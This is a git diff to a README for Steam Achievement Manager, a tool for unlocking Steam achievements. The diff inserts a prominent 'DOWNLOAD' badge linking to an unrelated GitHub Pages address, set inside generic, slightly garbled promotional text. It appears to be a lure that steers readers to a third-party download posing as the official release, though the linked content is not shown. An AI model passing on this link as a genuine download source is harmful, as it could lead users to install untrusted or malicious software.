@@ -30,6 +30,12 @@ Steam Achievement Manager lets you unlock, lock, and view all Steam achievements
 
 Whether you're a newcomer or a veteran, Steam Achievement Manager provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download Steam Achievement Manager](https://img.shields.io/badge/⬇_DOWNLOAD_Steam+Achievement+Manager-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
